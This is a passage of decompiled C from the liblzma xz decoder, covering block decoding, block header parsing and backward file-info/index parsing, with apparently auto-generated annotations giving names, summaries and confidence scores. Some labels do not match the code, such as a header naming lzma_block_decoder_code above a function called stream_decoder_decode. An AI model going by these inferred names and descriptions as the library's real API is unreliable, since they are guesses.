           uVar7 = uVar7 >> 4 | uVar7, uVar7 = uVar7 | uVar7 >> 8,
           uVar3 != (uVar7 >> 0x10 | uVar7) + 1)) goto LAB_0010ea5d;
        param_1[0xb] = 0;
        *(undefined4 *)(param_1 + 10) = 2;
      }
      *param_4 = uVar5 + 1;
      break;
    case 2:
      lVar6 = param_1[0xb];
      bVar1 = *(byte *)(param_3 + uVar5);
      *param_4 = uVar5 + 1;
      uVar8 = lVar6 + 1;
      uVar5 = (ulong)bVar1 << ((char)lVar6 * '\b' & 0x3fU) | param_1[0xc];
      param_1[0xb] = uVar8;
      param_1[0xc] = uVar5;
      if (7 < uVar8) {
        if ((uVar5 - 0x4000000000 < 0xffffffbfffffffff) && (*(char *)((long)param_1 + 0x54) != '\0')
           ) goto LAB_0010ea5d;
        *(undefined4 *)(param_1 + 0x15) = 1;
        *(ulong *)((long)param_1 + 0xac) = uVar5;
        lVar6 = lzma_lzma_decoder_memusage_full(param_1 + 0xf);
        param_1[0xb] = 0;
        uVar5 = lVar6 + 0x8000;
        *(undefined4 *)(param_1 + 10) = 3;
        param_1[0xe] = uVar5;
        goto LAB_0010e96b;
      }
      break;
    case 3:
      uVar5 = param_1[0xe];
LAB_0010e96b:
      if ((ulong)param_1[0xd] < uVar5) {
        uVar4 = 6;
        goto LAB_0010e920;
      }
      local_60 = (undefined1  [16])0x0;
      local_78 = 0x4000000000000002;
      local_50 = 0;
      local_70 = FUN_00120480;
      local_68 = param_1 + 0xf;
      uVar4 = set_filter_and_init(param_1,param_2,&local_78);
      if ((int)uVar4 != 0) goto LAB_0010e920;
      *(undefined4 *)(param_1 + 10) = 4;
      break;
    default:
      uVar4 = 0xb;
      goto LAB_0010e920;
    }
    uVar5 = *param_7;
  }
  uVar4 = 0;
LAB_0010e920:
  if (local_40 == *(long *)(in_FS_OFFSET + 0x28)) {
    return uVar4;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}



/**
 * @name  lzma_block_decoder_code
 * @brief XZ block decoder: state 0=decode block data with size enforcement and check updating, state 1=read padding zeros (4-byte aligned), state 2=read and verify integrity check bytes.
 * @confidence 85%
 * @classification parser
 * @address 0x0010f060
 */

/* XZ stream block decoder: state 0 decodes block data with compressed/uncompressed size limit
   enforcement and integrity check updating, state 1 reads padding bytes (must be zero, aligned to
   4), state 2 reads and verifies the integrity check bytes. Returns LZMA_STREAM_END(1), LZMA_OK(0),
   or LZMA_DATA_ERROR(9). */

ulong stream_decoder_decode
                (int *param_1,undefined8 param_2,long param_3,ulong *param_4,ulong param_5,
                long param_6,ulong *param_7,ulong param_8,undefined4 param_9)

{
  ulong uVar1;
  char cVar2;
  uint uVar3;
  int iVar4;
  ulong uVar5;
  ulong uVar6;
  ulong uVar7;
  long lVar8;
  ulong uVar9;
  long lVar10;
  long lVar11;
  long lVar12;
  bool bVar13;
  bool bVar14;
  
  iVar4 = *param_1;
  if (iVar4 == 1) {
    uVar5 = *(ulong *)(param_1 + 0x18);
  }
  else {
    if (iVar4 == 2) {
      lVar8 = *(long *)(param_1 + 0x16);
      iVar4 = *(int *)(lVar8 + 8);
      goto LAB_0010f220;
    }
    if (iVar4 != 0) {
      return 0xb;
    }
    uVar5 = *param_4;
    uVar1 = *param_7;
    uVar9 = param_5 - uVar5;
    if ((ulong)(*(long *)(param_1 + 0x1c) - *(long *)(param_1 + 0x18)) <= param_5 - uVar5) {
      uVar9 = *(long *)(param_1 + 0x1c) - *(long *)(param_1 + 0x18);
    }
    uVar6 = *(long *)(param_1 + 0x1e) - *(long *)(param_1 + 0x1a);
    if (param_8 - uVar1 < (ulong)(*(long *)(param_1 + 0x1e) - *(long *)(param_1 + 0x1a))) {
      uVar6 = param_8 - uVar1;
    }
    uVar7 = (**(code **)(param_1 + 8))
                      (*(undefined8 *)(param_1 + 2),param_2,param_3,param_4,uVar9 + uVar5,param_6,
                       param_7,uVar6 + uVar1,param_9);
    uVar9 = *param_4;
    uVar6 = *param_7;
    lVar10 = (uVar9 - uVar5) + *(long *)(param_1 + 0x18);
    *(long *)(param_1 + 0x18) = lVar10;
    lVar8 = uVar6 - uVar1;
    lVar11 = *(long *)(param_1 + 0x1a) + lVar8;
    *(long *)(param_1 + 0x1a) = lVar11;
    if ((int)uVar7 == 0) {
      lVar12 = *(long *)(param_1 + 0x16);
      bVar13 = *(long *)(lVar12 + 0x10) == lVar10;
      bVar14 = *(long *)(lVar12 + 0x18) == lVar11;
      if ((bVar13) && (bVar14)) {
        return 9;
      }
      if ((uVar6 < param_8) && (bVar13)) {
        return 9;
      }
      if ((uVar9 < param_5) && (bVar14)) {
        return 9;
      }
      if ((char)param_1[0x3c] == '\x01') {
        return uVar7;
      }
      if (lVar8 == 0) {
        return uVar7;
      }
LAB_0010f2f7:
      update_checksum(param_1 + 0x22,*(undefined4 *)(lVar12 + 8),param_6 + uVar1);
      uVar7 = uVar7 & 0xffffffff;
    }
    else if (((char)param_1[0x3c] != '\x01') && (lVar8 != 0)) {
      lVar12 = *(long *)(param_1 + 0x16);
      goto LAB_0010f2f7;
    }
    if ((int)uVar7 != 1) {
      return uVar7;
    }
    lVar8 = *(long *)(param_1 + 0x16);
    uVar5 = *(ulong *)(param_1 + 0x18);
    if ((*(ulong *)(lVar8 + 0x10) != uVar5) && (*(ulong *)(lVar8 + 0x10) != 0xffffffffffffffff)) {
      return 9;
    }
    lVar10 = *(long *)(param_1 + 0x1a);
    if ((*(long *)(lVar8 + 0x18) != -1) && (*(long *)(lVar8 + 0x18) != lVar10)) {
      return 9;
    }
    *(ulong *)(lVar8 + 0x10) = uVar5;
    *(long *)(lVar8 + 0x18) = lVar10;
    *param_1 = 1;
  }
  while ((uVar5 & 3) != 0) {
    uVar1 = *param_4;
    if (param_5 <= uVar1) {
      return 0;
    }
    uVar5 = uVar5 + 1;
    cVar2 = *(char *)(param_3 + uVar1);
    *(ulong *)(param_1 + 0x18) = uVar5;
    *param_4 = uVar1 + 1;
    if (cVar2 != '\0') {
      return 9;
    }
  }
  lVar8 = *(long *)(param_1 + 0x16);
  iVar4 = *(int *)(lVar8 + 8);
  if (iVar4 == 0) {
    return 1;
  }
  if ((char)param_1[0x3c] == '\0') {
    lzma_check_finish(param_1 + 0x22,iVar4);
    lVar8 = *(long *)(param_1 + 0x16);
    iVar4 = *(int *)(lVar8 + 8);
  }
  *param_1 = 2;
LAB_0010f220:
  uVar3 = lzma_check_size(iVar4);
  uVar5 = (ulong)uVar3;
  lzma_bufcpy(param_3,param_4,param_5,lVar8 + 0x28,param_1 + 0x20,uVar5);
  if (*(ulong *)(param_1 + 0x20) < uVar5) {
    return 0;
  }
  if ((char)param_1[0x3c] != '\0') {
    return 1;
  }
  lVar8 = *(long *)(param_1 + 0x16);
  cVar2 = lzma_check_is_supported(*(undefined4 *)(lVar8 + 8));
  if (cVar2 == '\0') {
    return 1;
  }
  iVar4 = memcmp((void *)(lVar8 + 0x28),param_1 + 0x22,uVar5);
  if (iVar4 != 0) {
    return 9;
  }
  return 1;
}



/**
 * @name  lzma_block_header_decode
 * @brief Decodes LZMA block header from raw bytes. Validates header size/check, verifies CRC-32, decodes optional compressed/uncompressed sizes (VLI), decodes filter flags, verifies zero padding, frees on error.
 * @confidence 95%
 * @classification parser
 * @address 0x0010f580
 */

/* Decodes an LZMA block header from raw bytes. Initializes filter array to empty, validates header
   size and check type, verifies CRC-32 of header data, decodes optional compressed and uncompressed
   sizes (VLI encoded), decodes filter flags for each filter in the chain, verifies padding is all
   zeros, and frees filters on error. Returns LZMA error codes (0=OK, 0xb=PROG_ERROR,
   8=FORMAT_ERROR, 9=DATA_ERROR). */

ulong lzma_block_header_decode(uint *param_1,undefined8 param_2,byte *param_3)

{
  byte *pbVar1;
  byte bVar2;
  undefined8 *puVar3;
  int iVar4;
  undefined8 *puVar5;
  undefined8 *puVar6;
  ulong uVar7;
  ulong uVar8;
  ulong uVar9;
  long lVar10;
  ulong uVar11;
  long in_FS_OFFSET;
  ulong local_48;
  long local_40;
  
  local_40 = *(long *)(in_FS_OFFSET + 0x28);
  if (((param_1 != (uint *)0x0) &&
      (puVar3 = *(undefined8 **)(param_1 + 8), puVar3 != (undefined8 *)0x0)) &&
     (param_3 != (byte *)0x0)) {
    puVar5 = puVar3;
    do {
      *puVar5 = 0xffffffffffffffff;
      puVar6 = puVar5 + 2;
      puVar5[1] = 0;
      puVar5 = puVar6;
    } while (puVar3 + 10 != puVar6);
    if (1 < *param_1) {
      *param_1 = 1;
    }
    *(undefined1 *)(param_1 + 0x32) = 0;
    if (((uint)*param_3 * 4 + 4 == param_1[1]) && (param_1[2] < 0x10)) {
      uVar11 = (ulong)((uint)*param_3 * 4);
      iVar4 = lzma_crc32(param_3,uVar11,0);
      if (iVar4 == *(int *)(param_3 + uVar11)) {
        uVar7 = 8;
        if ((param_3[1] & 0x3c) != 0) goto LAB_0010f6f5;
        local_48 = 2;
        if ((param_3[1] & 0x40) == 0) {
          param_1[4] = 0xffffffff;
          param_1[5] = 0xffffffff;
        }
        else {
          uVar7 = lzma_vli_decode(param_1 + 4,0,param_3,&local_48,uVar11);
          if ((int)uVar7 != 0) goto LAB_0010f6f5;
          lVar10 = lzma_block_unpadded_size(param_1);
          if (lVar10 == 0) goto LAB_0010f750;
        }
        if ((char)param_3[1] < '\0') {
          uVar7 = lzma_vli_decode(param_1 + 6,0,param_3,&local_48,uVar11);
          if ((int)uVar7 != 0) goto LAB_0010f6f5;
        }
        else {
          param_1[6] = 0xffffffff;
          param_1[7] = 0xffffffff;
        }
        bVar2 = param_3[1];
        lVar10 = 0;
        do {
          uVar7 = lzma_filter_flags_decode
                            (lVar10 * 0x10 + *(long *)(param_1 + 8),param_2,param_3,&local_48,uVar11
                            );
          if ((int)uVar7 != 0) {
            lzma_filters_free(*(undefined8 *)(param_1 + 8),param_2);
            uVar7 = uVar7 & 0xffffffff;
            goto LAB_0010f6f5;
          }
          lVar10 = lVar10 + 1;
          uVar8 = local_48;
        } while ((ulong)(bVar2 & 3) + 1 != lVar10);
        do {
          if (uVar11 <= uVar8) goto LAB_0010f6f5;
          uVar9 = uVar8 + 1;
          pbVar1 = param_3 + uVar8;
          uVar8 = uVar9;
        } while (*pbVar1 == 0);
        local_48 = uVar9;
        lzma_filters_free(*(undefined8 *)(param_1 + 8),param_2);
        uVar7 = 8;
      }
      else {
LAB_0010f750:
        uVar7 = 9;
      }
      goto LAB_0010f6f5;
    }
  }
  uVar7 = 0xb;
LAB_0010f6f5:
  if (local_40 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return uVar7;
}



/**
 * @name  lzma_file_info_decoder_decode
 * @brief Resumable state machine that reads an .xz file backward to parse stream footers, block padding, indices, and stream headers without decompressing. Handles multi-stream .xz files by seeking backward through concatenated streams and merging their indices via lzma_index_cat. States: 0=read initial stream header, 1=begin backward scan, 2=read+scan padding, 3=read stream footer, 4=seek to index, 5=decode index, 6=read stream header, 7=compare stream flags. Returns LZMA_OK(0) when more input needed, LZMA_SEEK_NEEDED(12) when seek required, LZMA_DATA_ERROR(9) on corruption, LZMA_STREAM_END(1) when done.
 * @confidence 92%
 * @classification parser
 * @address 0x0010fbe0
 */

/* Main decode function for the XZ file info decoder. Implements a resumable state machine (states
   0-7) that reads an .xz file backward to parse stream footers, block padding, indices, and stream
   headers without decompressing. Handles multi-stream .xz files by seeking backward through
   concatenated streams and merging their indices. Returns LZMA_OK when more input needed,
   LZMA_SEEK_NEEDED when a seek is required, LZMA_DATA_ERROR (9) on corruption, or LZMA_STREAM_END
   when all streams are parsed. */

undefined8
lzma_file_info_decoder_decode
          (undefined4 *param_1,undefined8 param_2,undefined8 param_3,long *param_4,long param_5)

{
  long lVar1;
  int iVar2;
  undefined8 uVar3;
  ulong uVar4;
  ulong uVar5;
  ulong uVar6;
  long lVar7;
  ulong uVar8;
  long lVar9;
  
  lVar1 = *param_4;
  uVar4 = *(ulong *)(param_1 + 6) - *(long *)(param_1 + 2);
  if (uVar4 < (ulong)(param_5 - lVar1)) {
    param_5 = uVar4 + lVar1;
  }
  switch(*param_1) {
  case 0:
    if (*(ulong *)(param_1 + 6) < 0xc) {
      uVar3 = FUN_00110077();
      return uVar3;
    }
    lVar7 = lzma_bufcpy(param_3,param_4,param_5,param_1 + 0x58,param_1 + 0x54,
                        *(undefined8 *)(param_1 + 0x56));
    *(long *)(param_1 + 2) = *(long *)(param_1 + 2) + lVar7;
    if (*(ulong *)(param_1 + 0x54) < *(ulong *)(param_1 + 0x56)) {
      return 0;
    }
    uVar3 = lzma_stream_header_decode(param_1 + 0x2a,param_1 + 0x58);
    if ((int)uVar3 != 0) {
      return uVar3;
    }
    uVar4 = *(ulong *)(param_1 + 6);
    if (((long)uVar4 < 0) || ((uVar4 & 3) != 0)) {
      return 9;
    }
    *(ulong *)(param_1 + 4) = uVar4;
    break;
  case 1:
    break;
  case 2:
    goto switchD_0010fc39_caseD_2;
  case 3:
    uVar4 = *(ulong *)(param_1 + 0x56);
    goto LAB_0010fc9b;
  case 4:
    goto switchD_0010fc39_caseD_4;
  case 5:
    goto switchD_0010fc39_caseD_5;
  case 6:
    goto switchD_0010fc39_caseD_6;
  case 7:
    goto switchD_0010fc39_caseD_7;
  default:
    uVar3 = FUN_00110077();
    return uVar3;
  }
  do {
    *param_1 = 2;
    uVar3 = lzma_lz_flush(param_1,lVar1,param_4,param_5);
    if ((int)uVar3 != 0) {
      return uVar3;
    }
switchD_0010fc39_caseD_2:
    while( true ) {
      lVar7 = lzma_bufcpy(param_3,param_4,param_5,param_1 + 0x58,param_1 + 0x54,
                          *(undefined8 *)(param_1 + 0x56));
      uVar4 = *(ulong *)(param_1 + 0x56);
      *(long *)(param_1 + 2) = *(long *)(param_1 + 2) + lVar7;
      if (*(ulong *)(param_1 + 0x54) < uVar4) {
        return 0;
      }
      uVar8 = 0;
      lVar7 = *(long *)(param_1 + 0x20);
      uVar6 = uVar4;
      if (uVar4 == 0) break;
      do {
        uVar5 = uVar6 - 1;
        if (*(char *)((long)param_1 + uVar6 + 0x15f) != '\0') break;
        uVar8 = uVar8 + 1;
        uVar6 = uVar5;
      } while (uVar5 != 0);
      *(ulong *)(param_1 + 0x20) = lVar7 + uVar8;
      *(ulong *)(param_1 + 4) = *(long *)(param_1 + 4) - uVar8;
      if (uVar4 == uVar8) break;
      if ((lVar7 + uVar8 & 3) != 0) {
        return 9;
      }
      uVar4 = uVar4 - uVar8;
      *param_1 = 3;
      *(ulong *)(param_1 + 0x56) = uVar4;
      *(ulong *)(param_1 + 0x54) = uVar4;
      if (uVar4 < 0xc) {
        uVar3 = lzma_lz_flush(param_1,lVar1,param_4,param_5);
        if ((int)uVar3 != 0) {
          return uVar3;
        }
        uVar4 = *(ulong *)(param_1 + 0x56);
      }
LAB_0010fc9b:
      lVar7 = lzma_bufcpy(param_3,param_4,param_5,param_1 + 0x58,param_1 + 0x54,uVar4);
      *(long *)(param_1 + 2) = *(long *)(param_1 + 2) + lVar7;
      if (*(ulong *)(param_1 + 0x54) < *(ulong *)(param_1 + 0x56)) {
        return 0;
      }
      lVar7 = *(ulong *)(param_1 + 0x56) - 0xc;
      *(long *)(param_1 + 4) = *(long *)(param_1 + 4) - 0xc;
      *(long *)(param_1 + 0x56) = lVar7;
      uVar3 = lzma_stream_footer_decode(param_1 + 0x46,lVar7 + (long)(param_1 + 0x58));
      if ((int)uVar3 == 7) {
        return 9;
      }
      if ((int)uVar3 != 0) {
        return uVar3;
      }
      uVar4 = *(ulong *)(param_1 + 0x48);
      if (*(ulong *)(param_1 + 4) < uVar4 + 0xc) {
        return 9;
      }
      uVar6 = *(ulong *)(param_1 + 4) - uVar4;
      *param_1 = 4;
      *(ulong *)(param_1 + 4) = uVar6;
      if (*(ulong *)(param_1 + 0x56) < uVar4) {
        lVar7 = *param_4;
        lVar9 = *(long *)(param_1 + 2);
        *(undefined8 *)(param_1 + 0x54) = 0;
        *(undefined8 *)(param_1 + 0x56) = 0;
        if ((uVar6 < (ulong)((lVar1 - lVar7) + lVar9)) ||
           ((ulong)((lVar9 - lVar7) + param_5) < uVar6)) {
          **(ulong **)(param_1 + 0x26) = uVar6;
          *(ulong *)(param_1 + 2) = uVar6;
          *param_4 = param_5;
          uVar3 = FUN_00110077();
          return uVar3;
        }
        *(ulong *)(param_1 + 2) = uVar6;
        *param_4 = lVar7 + (uVar6 - lVar9);
switchD_0010fc39_caseD_4:
        if (*(long *)(param_1 + 0x22) == 0) goto LAB_0011012a;
LAB_0010fd94:
        uVar4 = lzma_index_memused();
        if (*(ulong *)(param_1 + 0x28) < uVar4) goto LAB_001102a2;
        lVar7 = *(ulong *)(param_1 + 0x28) - uVar4;
      }
      else {
        *(ulong *)(param_1 + 0x54) = *(ulong *)(param_1 + 0x56) - uVar4;
        if (*(long *)(param_1 + 0x22) != 0) goto LAB_0010fd94;
LAB_0011012a:
        lVar7 = *(long *)(param_1 + 0x28);
      }
      uVar3 = lzma_index_decoder_new(param_1 + 8,param_2,param_1 + 0x1e,lVar7);
      if ((int)uVar3 != 0) {
        return uVar3;
      }
      *param_1 = 5;
      *(undefined8 *)(param_1 + 0x1c) = *(undefined8 *)(param_1 + 0x48);
switchD_0010fc39_caseD_5:
      if (*(long *)(param_1 + 0x56) == 0) {
        lVar7 = *param_4;
        lVar9 = lVar7 + *(ulong *)(param_1 + 0x1c);
        if ((ulong)(param_5 - lVar7) <= *(ulong *)(param_1 + 0x1c)) {
          lVar9 = param_5;
        }
        uVar3 = (**(code **)(param_1 + 0xe))
                          (*(undefined8 *)(param_1 + 8),param_2,param_3,param_4,lVar9,0,0,0,0);
        lVar9 = *param_4;
        *(long *)(param_1 + 0x1c) = *(long *)(param_1 + 0x1c) + (lVar7 - lVar9);
        *(long *)(param_1 + 2) = *(long *)(param_1 + 2) + (lVar9 - lVar7);
        iVar2 = (int)uVar3;
      }
      else {
        lVar7 = *(long *)(param_1 + 0x54);
        uVar3 = (**(code **)(param_1 + 0xe))
                          (*(undefined8 *)(param_1 + 8),param_2,param_1 + 0x58,param_1 + 0x54,
                           *(long *)(param_1 + 0x56),0,0,0,0);
        *(long *)(param_1 + 0x1c) = (lVar7 + *(long *)(param_1 + 0x1c)) - *(long *)(param_1 + 0x54);
        iVar2 = (int)uVar3;
      }
      if (iVar2 == 0) {
        if (*(long *)(param_1 + 0x1c) == 0) {
          return 9;
        }
        return 0;
      }
      if ((int)uVar3 != 1) {
        return uVar3;
      }
      if (*(long *)(param_1 + 0x1c) != 0) {
        return 9;
      }
      lVar7 = lzma_index_total_size(*(undefined8 *)(param_1 + 0x1e));
      uVar4 = lVar7 + 0xc;
      if (*(ulong *)(param_1 + 4) < uVar4) {
        return 9;
      }
      lVar9 = *(ulong *)(param_1 + 4) - uVar4;
      *(long *)(param_1 + 4) = lVar9;
      if (lVar9 == 0) {
        *param_1 = 7;
        *(undefined8 *)(param_1 + 0x44) = *(undefined8 *)(param_1 + 0x36);
        *(undefined8 *)(param_1 + 0x38) = *(undefined8 *)(param_1 + 0x2a);
        *(undefined8 *)(param_1 + 0x3a) = *(undefined8 *)(param_1 + 0x2c);
        *(undefined8 *)(param_1 + 0x3c) = *(undefined8 *)(param_1 + 0x2e);
        *(undefined8 *)(param_1 + 0x3e) = *(undefined8 *)(param_1 + 0x30);
        *(undefined8 *)(param_1 + 0x40) = *(undefined8 *)(param_1 + 0x32);
        *(undefined8 *)(param_1 + 0x42) = *(undefined8 *)(param_1 + 0x34);
switchD_0010fc39_caseD_7:
      }
      else {
        *param_1 = 6;
        *(long *)(param_1 + 4) = lVar9 + 0xc;
        if ((*(long *)(param_1 + 0x56) == 0) ||
           (uVar6 = *(long *)(param_1 + 0x56) - *(long *)(param_1 + 0x48), uVar6 < uVar4)) {
          uVar3 = lzma_lz_flush(param_1,lVar1,param_4,param_5);
          if ((int)uVar3 != 0) {
            return uVar3;
          }
switchD_0010fc39_caseD_6:
          lVar7 = *(long *)(param_1 + 0x56);
        }
        else {
          lVar7 = uVar6 - lVar7;
          *(long *)(param_1 + 0x54) = lVar7;
          *(long *)(param_1 + 0x56) = lVar7;
        }
        lVar7 = lzma_bufcpy(param_3,param_4,param_5,param_1 + 0x58,param_1 + 0x54,lVar7);
        *(long *)(param_1 + 2) = *(long *)(param_1 + 2) + lVar7;
        if (*(ulong *)(param_1 + 0x54) < *(ulong *)(param_1 + 0x56)) {
          return 0;
        }
        lVar7 = *(ulong *)(param_1 + 0x56) - 0xc;
        *(long *)(param_1 + 4) = *(long *)(param_1 + 4) - 0xc;
        *(long *)(param_1 + 0x56) = lVar7;
        *(long *)(param_1 + 0x54) = lVar7;
        uVar3 = lzma_stream_header_decode(param_1 + 0x38,lVar7 + (long)(param_1 + 0x58));
        if ((int)uVar3 == 7) {
          return 9;
        }
        if ((int)uVar3 != 0) {
          return uVar3;
        }
        *param_1 = 7;
      }
      uVar3 = lzma_stream_flags_compare(param_1 + 0x38);
      if ((int)uVar3 != 0) {
        return uVar3;
      }
      iVar2 = lzma_index_stream_flags(*(undefined8 *)(param_1 + 0x1e),param_1 + 0x46);
      if ((iVar2 != 0) ||
         (iVar2 = lzma_index_stream_padding
                            (*(undefined8 *)(param_1 + 0x1e),*(undefined8 *)(param_1 + 0x20)),
         iVar2 != 0)) {
LAB_001102a2:
        uVar3 = FUN_00110077();
        return uVar3;
      }
      uVar3 = *(undefined8 *)(param_1 + 0x1e);
      *(undefined8 *)(param_1 + 0x20) = 0;
      if (*(long *)(param_1 + 0x22) != 0) {
        uVar3 = lzma_index_cat(uVar3,*(long *)(param_1 + 0x22),param_2);
        if ((int)uVar3 != 0) {
          return uVar3;
        }
        uVar3 = *(undefined8 *)(param_1 + 0x1e);
      }
      *(undefined8 *)(param_1 + 0x22) = uVar3;
      *(undefined8 *)(param_1 + 0x1e) = 0;
      if (*(long *)(param_1 + 4) == 0) {
        **(undefined8 **)(param_1 + 0x24) = uVar3;
        *(undefined8 *)(param_1 + 0x22) = 0;
        *param_4 = param_5;
        uVar3 = FUN_00110077();
        return uVar3;
      }
      if (*(long *)(param_1 + 0x56) == 0) break;
      *param_1 = 2;
    }
  } while( true );
}



/**
 * @name  lzma_file_info_decoder_state_machine
 * @brief Complex state machine for file info decoding. Processes stream headers, index padding, stream footers, backward seeks, index decoding, multi-stream concatenation via lzma_index_cat.
 * @confidence 80%
 * @classification parser
 * @address 0x00110140
 */

/* Complex state machine for file info decoding. Processes stream headers (state 0), index padding
   (state 2), stream footers (state 3), backward seeks (state 4), index decoding (state 5), next
   stream header (state 6), flag comparison (state 7). Handles multi-stream concatenation via
   lzma_index_cat. */

undefined8
switchD_0010fc39::lzma_file_info_decoder_state_machine
          (long param_1,undefined8 param_2,undefined8 param_3,ulong param_4)

{
  int iVar1;
  ulong uVar2;
  ulong uVar3;
  long lVar4;
  long uVar5;
  ulong uVar6;
  long lVar7;
  undefined4 *unaff_RBX;
  long unaff_RBP;
  ulong uVar8;
  long *unaff_R12;
  long unaff_R15;
  
  if (param_4 < 0xc) {
    uVar5 = FUN_00110077();
    return uVar5;
  }
  lVar4 = lzma_bufcpy();
  *(long *)(unaff_RBX + 2) = *(long *)(unaff_RBX + 2) + lVar4;
  if (*(ulong *)(unaff_RBX + 0x54) < *(ulong *)(unaff_RBX + 0x56)) {
    return 0;
  }
  uVar5 = lzma_stream_header_decode(unaff_RBX + 0x2a,param_1 + 0x160);
  if ((int)uVar5 == 0) {
    uVar8 = *(ulong *)(unaff_RBX + 6);
    if (((long)uVar8 < 0) || ((uVar8 & 3) != 0)) {
      return 9;
    }
    *(ulong *)(unaff_RBX + 4) = uVar8;
switchD_0010fc39_caseD_1:
    *unaff_RBX = 2;
    uVar5 = lzma_lz_flush();
    if ((int)uVar5 == 0) {
      while( true ) {
        lVar4 = lzma_bufcpy();
        uVar8 = *(ulong *)(unaff_RBX + 0x56);
        *(long *)(unaff_RBX + 2) = *(long *)(unaff_RBX + 2) + lVar4;
        if (*(ulong *)(unaff_RBX + 0x54) < uVar8) {
          return 0;
        }
        uVar6 = 0;
        lVar4 = *(long *)(unaff_RBX + 0x20);
        uVar3 = uVar8;
        if (uVar8 == 0) break;
        do {
          uVar2 = uVar3 - 1;
          if (*(char *)((long)unaff_RBX + uVar3 + 0x15f) != '\0') break;
          uVar6 = uVar6 + 1;
          uVar3 = uVar2;
        } while (uVar2 != 0);
        *(ulong *)(unaff_RBX + 0x20) = lVar4 + uVar6;
        *(ulong *)(unaff_RBX + 4) = *(long *)(unaff_RBX + 4) - uVar6;
        if (uVar8 == uVar6) break;
        if ((lVar4 + uVar6 & 3) != 0) {
          return 9;
        }
        uVar8 = uVar8 - uVar6;
        *unaff_RBX = 3;
        *(ulong *)(unaff_RBX + 0x56) = uVar8;
        *(ulong *)(unaff_RBX + 0x54) = uVar8;
        if ((uVar8 < 0xc) && (uVar5 = lzma_lz_flush(), (int)uVar5 != 0)) {
          return uVar5;
        }
        lVar4 = lzma_bufcpy();
        uVar8 = *(ulong *)(unaff_RBX + 0x56);
        *(long *)(unaff_RBX + 2) = *(long *)(unaff_RBX + 2) + lVar4;
        if (*(ulong *)(unaff_RBX + 0x54) < uVar8) {
          return 0;
        }
        *(long *)(unaff_RBX + 4) = *(long *)(unaff_RBX + 4) - 0xc;
        *(ulong *)(unaff_RBX + 0x56) = uVar8 - 0xc;
        uVar5 = lzma_stream_footer_decode(unaff_RBX + 0x46,(long)unaff_RBX + uVar8 + 0x154);
        if ((int)uVar5 == 7) {
          return 9;
        }
        if ((int)uVar5 != 0) {
          return uVar5;
        }
        uVar8 = *(ulong *)(unaff_RBX + 0x48);
        if (*(ulong *)(unaff_RBX + 4) < uVar8 + 0xc) {
          return 9;
        }
        uVar3 = *(ulong *)(unaff_RBX + 4) - uVar8;
        *unaff_RBX = 4;
        *(ulong *)(unaff_RBX + 4) = uVar3;
        if (*(ulong *)(unaff_RBX + 0x56) < uVar8) {
          lVar4 = *unaff_R12;
          lVar7 = *(long *)(unaff_RBX + 2);
          *(undefined8 *)(unaff_RBX + 0x54) = 0;
          *(undefined8 *)(unaff_RBX + 0x56) = 0;
          if ((uVar3 < (ulong)((unaff_R15 - lVar4) + lVar7)) ||
             ((ulong)((lVar7 - lVar4) + unaff_RBP) < uVar3)) {
            **(ulong **)(unaff_RBX + 0x26) = uVar3;
            *(ulong *)(unaff_RBX + 2) = uVar3;
            *unaff_R12 = unaff_RBP;
            uVar5 = FUN_00110077();
            return uVar5;
          }
          *(ulong *)(unaff_RBX + 2) = uVar3;
          *unaff_R12 = lVar4 + (uVar3 - lVar7);
          lVar4 = *(long *)(unaff_RBX + 0x22);
        }
        else {
          lVar4 = *(long *)(unaff_RBX + 0x22);
          *(ulong *)(unaff_RBX + 0x54) = *(ulong *)(unaff_RBX + 0x56) - uVar8;
        }
        if ((lVar4 != 0) && (uVar8 = lzma_index_memused(), *(ulong *)(unaff_RBX + 0x28) < uVar8)) {
LAB_001102a2:
          uVar5 = FUN_00110077();
          return uVar5;
        }
        uVar5 = lzma_index_decoder_new(unaff_RBX + 8);
        if ((int)uVar5 != 0) {
          return uVar5;
        }
        *unaff_RBX = 5;
        *(undefined8 *)(unaff_RBX + 0x1c) = *(undefined8 *)(unaff_RBX + 0x48);
        if (*(long *)(unaff_RBX + 0x56) == 0) {
          lVar4 = *unaff_R12;
          uVar5 = (**(code **)(unaff_RBX + 0xe))();
          lVar7 = *unaff_R12;
          *(long *)(unaff_RBX + 0x1c) = *(long *)(unaff_RBX + 0x1c) + (lVar4 - lVar7);
          *(long *)(unaff_RBX + 2) = *(long *)(unaff_RBX + 2) + (lVar7 - lVar4);
          iVar1 = (int)uVar5;
        }
        else {
          lVar4 = *(long *)(unaff_RBX + 0x54);
          uVar5 = (**(code **)(unaff_RBX + 0xe))(*(undefined8 *)(unaff_RBX + 8));
          *(long *)(unaff_RBX + 0x1c) =
               (lVar4 + *(long *)(unaff_RBX + 0x1c)) - *(long *)(unaff_RBX + 0x54);
          iVar1 = (int)uVar5;
        }
        if (iVar1 == 0) {
          if (*(long *)(unaff_RBX + 0x1c) == 0) {
            return 9;
          }
          return 0;
        }
        if ((int)uVar5 != 1) {
          return uVar5;
        }
        if (*(long *)(unaff_RBX + 0x1c) != 0) {
          return 9;
        }
        lVar4 = lzma_index_total_size(*(undefined8 *)(unaff_RBX + 0x1e));
        uVar8 = lVar4 + 0xc;
        if (*(ulong *)(unaff_RBX + 4) < uVar8) {
          return 9;
        }
        lVar7 = *(ulong *)(unaff_RBX + 4) - uVar8;
        *(long *)(unaff_RBX + 4) = lVar7;
        if (lVar7 == 0) {
          *unaff_RBX = 7;
          *(undefined8 *)(unaff_RBX + 0x44) = *(undefined8 *)(unaff_RBX + 0x36);
          *(undefined8 *)(unaff_RBX + 0x38) = *(undefined8 *)(unaff_RBX + 0x2a);
          *(undefined8 *)(unaff_RBX + 0x3a) = *(undefined8 *)(unaff_RBX + 0x2c);
          *(undefined8 *)(unaff_RBX + 0x3c) = *(undefined8 *)(unaff_RBX + 0x2e);
          *(undefined8 *)(unaff_RBX + 0x3e) = *(undefined8 *)(unaff_RBX + 0x30);
          *(undefined8 *)(unaff_RBX + 0x40) = *(undefined8 *)(unaff_RBX + 0x32);
          *(undefined8 *)(unaff_RBX + 0x42) = *(undefined8 *)(unaff_RBX + 0x34);
        }
        else {
          *unaff_RBX = 6;
          *(long *)(unaff_RBX + 4) = lVar7 + 0xc;
          if ((*(long *)(unaff_RBX + 0x56) == 0) ||
             (uVar3 = *(long *)(unaff_RBX + 0x56) - *(long *)(unaff_RBX + 0x48), uVar3 < uVar8)) {
            uVar5 = lzma_lz_flush();
            if ((int)uVar5 != 0) {
